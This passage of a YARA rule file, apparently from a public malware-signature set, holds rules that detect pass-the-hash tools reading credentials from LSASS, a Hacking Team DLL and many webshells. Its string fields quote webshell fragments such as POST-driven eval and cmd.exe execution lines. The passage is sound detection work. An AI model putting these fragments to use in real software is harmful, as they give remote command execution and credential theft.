filename\" fullword ascii\n      $s3 = \"This tool lists the active LSA logon sessions with NTLM credentials.\" fullword ascii\n      $s4 = \"Error: pth.dll is not in the current directory!.\" fullword ascii\n      $s5 = \"the output format is: username:domain:lmhash:nthash\" fullword ascii\n      $s6 = \".\\\\pth.dll\" fullword ascii\n      $s7 = \"Cannot get LSASS.EXE PID!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 280KB and 2 of them\n}\n\nrule iam_alt_iam_alt_RID2D1E : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file iam-alt.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 10:18:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii\n      $s1 = \"IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii\n      $s2 = \"This tool allows you to change the NTLM credentials of the current logon session\" fullword ascii\n      $s3 = \"username:domainname:lmhash:nthash\" fullword ascii\n      $s4 = \"Error in cmdline!. Bye!.\" fullword ascii\n      $s5 = \"Error: Cannot open LSASS.EXE!.\" fullword ascii\n      $s6 = \"nthash is too long!.\" fullword ascii\n      $s7 = \"LSASS HANDLE: %x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule genhash_genhash_RID2D2C : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file genhash.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 10:20:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"genhash.exe <password>\" fullword ascii\n      $s3 = \"Password: %s\" fullword ascii\n      $s4 = \"%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\" fullword ascii\n      $s5 = \"This tool generates LM and NT hashes.\" fullword ascii\n      $s6 = \"(hashes format: LM Hash:NT hash)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule iam_iamdll_RID2B1A : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file iamdll.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 08:52:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LSASRV.DLL\" fullword ascii\n      $s1 = \"iamdll.dll\" fullword ascii\n      $s2 = \"ChangeCreds\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 115KB and all of them\n}\n\nrule iam_iam_RID29DE : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file iam.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 01:55:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii\n      $s2 = \"iam.exe -h administrator:mydomain:\" ascii\n      $s3 = \"An error was encountered when trying to change the current logon credentials!.\" fullword ascii\n      $s4 = \"optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter.\" fullword ascii\n      $s5 = \"IAM.EXE will try to locate some memory locations instead of using hard-coded values.\" fullword ascii\n      $s6 = \"Error in cmdline!. Bye!.\" fullword ascii\n      $s7 = \"Checking LSASRV.DLL....\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule whosthere_alt_pth_RID2E35 : APT DEMO EXE FILE T1550_002 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file pth.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 11:04:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, T1550_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c:\\\\debug.txt\" fullword ascii\n      $s1 = \"pth.dll\" fullword ascii\n      $s2 = \"\\\"Primary\\\" string found at %.8Xh\" fullword ascii\n      $s3 = \"\\\"Primary\\\" string not found!\" fullword ascii\n      $s4 = \"segment 1 found at %.8Xh\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 4 of them\n}\n\nrule whosthere_RID2AEA : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file whosthere_RID2AEA.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 09:21:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii\n      $s2 = \"whosthere_RID2AEA enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii\n      $s3 = \"specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES\" ascii\n      $s4 = \"Could not enable debug privileges. You must run this tool with an account with administrator privileges.\" fullword ascii\n      $s5 = \"-B is now used by default. Trying to find correct addresses..\" fullword ascii\n      $s6 = \"Cannot get LSASS.EXE PID!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 320KB and 2 of them\n}\n\nrule Hackingteam_Elevator_DLL_RID3049 : APT DEMO EXE FILE {\n   meta:\n      description = \"Hacking Team Disclosure Sample - file elevator.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://t.co/EG0qtVcKLh\"\n      date = \"2015-07-07 12:33:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\sysnative\\\\CI.dll\" ascii\n      $s2 = \"setx TOR_CONTROL_PASSWORD\" fullword ascii\n      $s3 = \"mitmproxy0\" fullword ascii\n      $s4 = \"\\\\insert_cert.exe\" ascii\n      $s5 = \"elevator.dll\" fullword ascii\n      $s6 = \"CRTDLL.DLL\" fullword ascii\n      $s7 = \"fail adding cert\" fullword ascii\n      $s8 = \"DownloadingFile\" fullword ascii\n      $s9 = \"fail adding cert: %s\" fullword ascii\n      $s10 = \"InternetOpenA fail\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 6 of them\n}\n\nrule CN_Honker_Webshell_PHP_php5_RID3120 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php5.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user\" ascii\n      $s20 = \"echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\\\"<b>\\\".$\" ascii\n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them\n}\n\nrule CN_Honker_Webshell_test3693_RID30F1 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file test3693.war\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p=Runtime.getRuntime().exec(\\\"cmd /c \\\"+strCmd);\" fullword ascii\n      $s2 = \"http://www.topronet.com </font>\\\",\\\" <font color=red> Thanks for your support - \" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 50KB and all of them\n}\n\nrule CN_Honker_Webshell_mycode12_RID3140 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mycode12.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:14:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<cfexecute name=\\\"cmd.exe\\\"\" fullword ascii\n      $s2 = \"<cfoutput>#cmd#</cfoutput>\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}\n\nrule CN_Honker_Webshell_offlibrary_RID328C : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file offlibrary.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:09:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"';$i=$g->query(\\\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING\" ascii\n      $s12 = \"if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju\" ascii\n   condition: \n      filesize < 1005KB and all of them\n}\n\nrule CN_Honker_Webshell_cfm_xl_RID30D5 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file xl.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input name=\\\"DESTINATION\\\" value=\\\"\" ascii\n      $s1 = \"<CFFILE ACTION=\\\"Write\\\" FILE=\\\"#Form.path#\\\" OUTPUT=\\\"#Form.cmd#\\\">\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x433c and filesize < 13KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_linux_RID31D3 : CHINA DEMO FILE LINUX T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file linux.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:39:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, LINUX, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<form name=form1 action=exploit.php method=post>\" fullword ascii\n      $s1 = \"<title>Changing CHMOD Permissions Exploit \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x696c and filesize < 6KB and all of them\n}\n\nrule CN_Honker_Webshell_Interception3389_get_RID35C6 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file get.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:27:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"userip = Request.ServerVariables(\\\"HTTP_X_FORWARDED_FOR\\\")\" fullword ascii\n      $s1 = \"file.writeline  szTime + \\\" HostName:\\\" + szhostname + \\\" IP:\\\" + userip+\\\":\\\"+n\" ascii\n      $s3 = \"set file=fs.OpenTextFile(server.MapPath(\\\"WinlogonHack.txt\\\"),8,True)\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}\n\nrule CN_Honker_Webshell_nc_1_RID2FBD : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file 1.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:10:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 \" ascii\n      $s2 = \"<%if session(\\\"pw\\\")<>\\\"go\\\" then %>\" fullword ascii\n   condition: \n      filesize < 11KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_BlackSky_RID32B7 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php6.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:17:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(gzinflate(base64_decode('\" ascii\n      $s1 = \"B1ac7Sky-->\" fullword ascii\n   condition: \n      filesize < 641KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_asp3_RID3116 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp3.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if shellpath=\\\"\\\" then shellpath = \\\"cmd.exe\\\"\" fullword ascii\n      $s2 = \"c.open \\\"GET\\\", \\\"http://127.0.0.1:\\\" & port & \\\"/M_Schumacher/upadmin/s3\\\", Tru\" ascii\n   condition: \n      filesize < 444KB and all of them\n}\n\nrule CN_Honker_Webshell_ASPX_sniff_RID320D : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file sniff.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:48:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));\" fullword ascii\n      $s2 = \"if (!logIt && my_s_smtp && (dport == 25 || sport == 25))\" fullword ascii\n   condition: \n      filesize < 91KB and all of them\n}\n\nrule CN_Honker_Webshell_udf_udf_RID3139 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file udf.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:13:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<?php // Source  My : Meiam  \" fullword ascii\n      $s2 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n   condition: \n      filesize < 430KB and all of them\n}\n\nrule CN_Honker_Webshell_JSP_jsp_RID30F5 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jsp.html\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:02:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input name=f size=30 value=shell.jsp>\" fullword ascii\n      $s2 = \"<font color=red>www.i0day.com  By:\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}\n\nrule CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail_RID36D6 : CHINA DEMO T1505_003 T1546_008 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mail.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:12:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, T1546_008, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (!$this->smtp_putcmd(\\\"AUTH LOGIN\\\", base64_encode($this->user)))\" fullword ascii\n      $s2 = \"$this->smtp_debug(\\\"> \\\".$cmd.\\\"\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 39KB and all of them\n}\n\nrule CN_Honker_Webshell_phpwebbackup_RID3358 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file phpwebbackup.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php // Code By isosky www.nbst.org\" fullword ascii\n      $s2 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 67KB and all of them\n}\n\nrule CN_Honker_Webshell_dz_phpcms_phpbb_RID348F : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file dz_phpcms_phpbb.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:35:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if($pwd == md5(md5($password).$salt))\" fullword ascii\n      $s2 = \"function test_1($password)\" fullword ascii\n      $s3 = \":\\\".$pwd.\\\"\\\\n---------------------------------\\\\n\\\";exit;\" fullword ascii\n      $s4 = \":user=\\\".$user.\\\"\\\\n\\\";echo \\\"pwd=\\\".$pwd.\\\"\\\\n\\\";echo \\\"salt=\\\".$salt.\\\"\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 22KB and all of them\n}\n\nrule CN_Honker_Webshell_picloaked_1_RID3298 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file 1.gif\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:11:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval($_POST[\" ascii\n      $s1 = \";<%execute(request(\" ascii\n      $s3 = \"GIF89a\" fullword ascii\n   condition: \n      filesize < 6KB and 2 of them\n}\n\nrule CN_Honker_Webshell_assembly_RID31BC : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file assembly.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:35:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write oScriptlhn.exec(\\\"cmd.exe /c\\\" & request(\\\"c\\\")).stdout.readall\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_php8_RID3123 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php8.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<a href=\\\"http://hi.baidu.com/ca3tie1/home\\\" target=\\\"_blank\\\">Ca3tie1's Blog</a\" ascii\n      $s1 = \"function startfile($path = 'dodo.zip')\" fullword ascii\n      $s3 = \"<form name=\\\"myform\\\" method=\\\"post\\\" action=\\\"\\\">\" fullword ascii\n      $s5 = \"$_REQUEST[zipname] = \\\"dodozip.zip\\\"; \" fullword ascii\n   condition: \n      filesize < 25KB and 2 of them\n}\n\nrule CN_Honker_Webshell_Tuoku_script_xx_RID34B7 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file xx.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:42:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$mysql.=\\\"insert into `$table`($keys) values($vals);\\\\r\\\\n\\\";\" fullword ascii\n      $s2 = \"$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password\" ascii\n      $s16 = \"mysql_query(\\\"SET NAMES gbk\\\");\" fullword ascii\n   condition: \n      filesize < 2KB and all of them\n}\n\nrule CN_Honker_Webshell_JSPMSSQL_RID30D9 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file JSPMSSQL.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:57:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<form action=\\\"?action=operator&cmd=execute\\\"\" fullword ascii\n      $s2 = \"String sql = request.getParameter(\\\"sqlcmd\\\");\" fullword ascii\n   condition: \n      filesize < 35KB and all of them\n}\n\nrule CN_Honker_Webshell_Injection_Transit_jmPost_RID381F : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jmPost.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 18:07:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"response.write  PostData(JMUrl,JmStr,JmCok,JmRef)\" fullword ascii\n      $s2 = \"JmdcwName=request(\\\"jmdcw\\\")\" fullword ascii\n   condition: \n      filesize < 9KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_web_asp_RID3280 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file web.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:07:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<FORM method=post target=_blank>ShellUrl: <INPUT \" fullword ascii\n      $s1 = \"\\\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>\" fullword ascii\n   condition: \n      filesize < 13KB and all of them\n}\n\nrule CN_Honker_Webshell_wshell_asp_RID328E : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file wshell-asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:10:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"file1.Write(\\\"<%response.clear:execute request(\\\\\\\"root\\\\\\\"):response.End%>\\\");\" fullword ascii\n      $s2 = \"hello word !  \" fullword ascii\n      $s3 = \"root.asp \" fullword ascii\n   condition: \n      filesize < 5KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_asp404_RID317B : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp404.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:24:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"temp1 = Len(folderspec) - Len(server.MapPath(\\\"./\\\")) -1\" fullword ascii\n      $s1 = \"<form name=\\\"form1\\\" method=\\\"post\\\" action=\\\"<%= url%>?action=chklogin\\\">\" fullword ascii\n      $s2 = \"<td>&nbsp;<a href=\\\"<%=tempurl+f1.name%>\\\" target=\\\"_blank\\\"><%=f1.name%></a></t\" ascii\n   condition: \n      filesize < 113KB and all of them\n}\n\nrule CN_Honker_Webshell_Serv_U_asp_RID3253 : CHINA DEMO T1087_002 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file Serv-U asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:00:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1087_002, T1505_003, WEBSHELL\"\n 